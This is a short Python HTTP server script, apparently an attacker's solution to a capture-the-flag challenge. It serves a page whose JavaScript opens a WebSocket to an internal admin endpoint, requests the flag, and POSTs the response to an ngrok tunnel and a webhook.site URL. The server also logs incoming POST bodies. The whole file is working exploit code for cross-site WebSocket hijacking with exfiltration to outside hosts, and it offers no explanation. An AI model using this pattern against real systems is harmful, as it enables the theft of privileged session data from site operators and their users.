from http.server import BaseHTTPRequestHandler, HTTPServer

class MyHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"""
            <!DOCTYPE html>
            <html>
            <head>
              <script>
                console.log("Script running on:", location.hostname);

                const ws = new WebSocket("ws://web:8080/admin/ws");
                console.log("END");

                ws.onopen = () => {
                  console.log("WebSocket connected");
                  ws.send("flag");
                };
                console.log("END");

                ws.onmessage = (message) => {
                  console.log("Flag received:", message.data);

                  // Send flag to your server (your ngrok)
                  fetch("https://b0a5-199-247-4-105.ngrok-free.app", {
                    method: "POST",
                    body: JSON.stringify({flag: message.data})
                  });

                  // Also send flag to Webhook.site
                  fetch("https://webhook.site/9591c938-e988-416a-8488-85b4ac4f3402", {
                    method: "POST",
                    headers: {
                      "Content-Type": "application/json"
                    },
                    body: JSON.stringify({flag: message.data})
                  }).then(() => {
                    console.log("Sent to webhook!");
                  }).catch((err) => {
                    console.error("Webhook send failed:", err);
                  });

                  ws.close();
                };
                console.log("END");
              </script>
            </head>
            </html>
        """)

    def do_POST(self):
        self.send_response(200)
        self.end_headers()
        content_len = int(self.headers.get('Content-Length', 0))
        print("ðŸ“¥ POST RECEIVED!")
        print(self.rfile.read(content_len))

def run(server_class=HTTPServer, handler_class=MyHandler):
    server_address = ('0.0.0.0', 8000)
    httpd = server_class(server_address, handler_class)
    print("ðŸš€ Server running on port 8000")
    httpd.serve_forever()

if __name__ == "__main__":
    run()
